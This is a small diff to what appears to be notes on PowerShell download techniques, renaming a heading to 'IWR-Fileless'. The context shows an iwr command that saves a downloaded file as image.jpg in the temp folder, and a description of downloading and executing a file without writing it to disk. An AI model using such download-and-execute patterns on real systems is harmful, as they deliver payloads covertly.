@@ -42,7 +42,7 @@ Use this environment variable to save a file to your desktop
 iwr < Your url for the intended file>?dl=1 -O $env:TMP\image.jpg
 ```
 
-### [IWR-Execute] 
+### [IWR-Fileless] 
 
 This formatting of the IWR function will download a file and execute it immedietely without saving it to memory
 
